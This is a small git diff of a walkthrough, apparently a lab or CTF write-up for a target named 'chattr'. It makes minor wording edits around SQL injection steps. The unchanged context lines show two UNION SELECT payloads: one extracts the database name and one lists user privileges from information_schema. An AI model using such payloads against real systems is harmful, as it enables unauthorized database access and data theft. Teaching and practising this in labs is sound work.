@@ -65,7 +65,7 @@ Lets start by determine the number of columns we are working with
 <img width="1282" height="445" alt="chattr1" src="https://github.com/user-attachments/assets/62606693-24af-4058-9f0b-a981d4dbd094" />
 
 
-To find the database name we can use the injection:
+Lets try a basic exploit to find the database name with this injection:
 
     ') UNION SELECT 1,2,database(),4 FROM INFORMATION_SCHEMA.SCHEMATA #
 
@@ -73,7 +73,8 @@ To find the database name we can use the injection:
 
 <img width="1282" height="445" alt="chattr2" src="https://github.com/user-attachments/assets/705aabe0-e1bc-4fee-acdd-471273234a79" />
 
-Next lets see what permissions are avalible with the payload:
+
+Next, lets see what permissions are avalible with the payload:
 
     ') UNION SELECT 1,2,GRANTEE,PRIVILEGE_TYPE FROM information_schema.USER_PRIVILEGES-- -
 
